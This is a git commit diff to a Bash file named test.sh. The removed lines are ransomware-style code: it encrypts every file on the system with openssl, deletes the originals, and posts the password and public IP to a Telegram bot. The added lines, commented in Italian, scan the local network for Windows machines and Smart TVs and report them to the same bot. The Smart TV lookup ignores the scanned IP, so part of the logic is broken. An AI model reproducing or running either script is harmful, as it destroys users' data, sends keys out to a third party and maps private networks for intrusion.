b2172d43c4b98f502303a2557160882bf5f62eb8
nouseramefounded <100087356+nouseramefounded@users.noreply.github.com>
2023-05-02 09:07:33 +0200

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,25 +1,28 @@
 #!/bin/bash
 
-#Crypt System
-#function to generate a random password
-function generate_password {
-    #generate a random password using openssl rand
-    password=$(openssl rand -base64 16)
-    #send the generated password
-    curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="System Crypted: $public_ip %0APassword: $password"
-}
-#call function
-generate_password
-#creates a list of all files
-files=$(find / -type f)
-#encrypts each file using the generated password
-for file in $files; do
-    #create encrypted file name
-    encrypted_file="$file.enc"
-    #encrypt the file using openssl and the generated password
-    openssl enc -aes-256-cbc -salt -in "$file" -out "$encrypted_file" -pass pass:"$password"
-    #eemoves the original file if encryption was successful
-    if [ $? -eq 0 ]; then
-        rm "$file"
+# Imposta la rete da scansionare
+NETWORK="192.168.1.0/24"
+
+# Scansiona la rete per trovare gli indirizzi IP attivi
+ACTIVE_IPS=$(nmap -sP $NETWORK | awk '/is up/ {print $2}')
+
+# Cicla su tutti gli indirizzi IP attivi
+for ip in $ACTIVE_IPS; do
+    # Verifica se l'indirizzo IP appartiene ad un dispositivo Windows
+    NAME=$(nbtscan -s : $ip | awk '/[[:alnum:]]+/ {print $1}')
+    if [[ $NAME != "" ]]; then
+        # Invia una notifica se viene trovato un dispositivo Windows
+        curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Dispositivo Windows trovato: %0A$NAME %0AIp: $ip"		
+    fi
+    
+    # Verifica se l'indirizzo IP appartiene ad una Smart TV
+    RESPONSE=$(upnpc -s | grep -E "(Device Type:.*SmartTV|MODEL_NAME)")
+    if [[ $RESPONSE != "" ]]; then
+        # Estrae il modello e la marca della Smart TV
+        MODEL=$(echo "$RESPONSE" | awk -F: '/MODEL_NAME/ {print $2}')
+        BRAND=$(echo "$RESPONSE" | awk -F: '/SmartTV/ {print $2}')
+        
+        # Invia una notifica se viene trovata una Smart TV
+        curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Smart TV trovata: Marca: $BRAND%0AModello: $MODEL%0AIndirizzo IP: $ip"		
     fi
 done
